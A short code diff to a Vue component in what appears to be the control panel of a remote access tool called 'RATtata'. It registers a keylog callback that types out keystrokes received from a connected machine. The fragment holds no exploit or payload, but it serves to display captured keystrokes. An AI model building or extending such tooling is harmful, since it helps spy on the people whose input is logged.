@@ -14,6 +14,7 @@ export default {
   components: {
     Card
   },
+
   computed: {
     data() {
       return this.$store.state.Connections.servers[this.iden];
@@ -35,6 +36,13 @@ export default {
     );
 
     this.typer = new Typer(typedElement, { clear: false });
+
+    window.RATtata.callbackEvents[this.iden] = {
+      ...(window.RATtata.callbackEvents[this.iden] || {}),
+      keylog: keyData => {
+        this.typer.type(keyData);
+      }
+    };
   }
 };
 </script>
